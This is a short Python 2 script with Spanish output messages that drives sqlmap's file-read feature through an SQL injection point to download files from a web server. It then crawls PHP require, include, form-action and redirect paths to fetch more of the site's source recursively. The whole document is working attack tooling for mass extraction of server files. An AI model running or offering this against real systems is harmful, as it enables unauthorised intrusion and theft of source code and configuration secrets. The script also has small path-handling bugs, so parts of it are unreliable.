#! /usr/bin/python

import commands
import os
import re
import sys



sqlmap_arg = sys.argv[1]
dirw = sys.argv[2]
droot = sys.argv[3]
files = sys.argv[4].split()

def download_file(f):	
	status, ret = commands.getstatusoutput("sqlmap " + sqlmap_arg + " --file-read=" + f + " --batch")
	patron = re.compile("files saved to.*\n\[\*\] (.*) \(size.*")
	filed = patron.findall(ret)
	if len(filed) > 0:	
		p, a = os.path.split(f)
		p += "//"
		if len(p.replace(droot,"")) > 0:
			dest = "output/" + dirw + "/" + p.replace(droot,"") + a
		else:
			dest = "output/" + dirw + "/" + a
		#os.rename(filed[0],dest)
		print("[+] Descargado el archivo " + f + "")
		return dest

#########################################################################################################

print("[*] Iniciando descarga")
		
if os.path.isdir("output"):
	print ("[+] Directorio output creado")
else:
	os.makedirs("output")
	print ("[+] Directorio output creado")

if os.path.isdir("output/" + dirw):
	print ("[+] Directorio " + dirw + " creado")
else:
	os.makedirs(dirw)
	print ("[+] Directorio " + dirw + " creado")

while (files):
	nf = download_file(files.pop())
	if nf:
		try:
			fo = open(nf,"r")
			fc = fo.read()
			fo.close()
		except IOError:
			fc = ""
			print ("[*] Error: no se puede abrir el archivo: " + nf)

		patron = re.compile("require.*['\"](.*?)[\"']|include.*['\"](.*?)[\"']|form.*action=['\"](.*?)[\"']|header\(\"[L,l]ocation:\s(.*?)[\"']")
		fs = patron.findall(fc)
		for j in fs:
			for i in j:
				if len(i) > 0:				
					files.append(droot + i)
					if len(os.path.split(i)[0]) > 0:
						try:
							os.makedirs("output/" + dirw + "/" + os.path.split(i)[0])
						except OSError:
							pass
					print("[-] Agregado " + droot + i + " a la cola...")		

print "[*] Descarga masiva finalizada en " + dirw

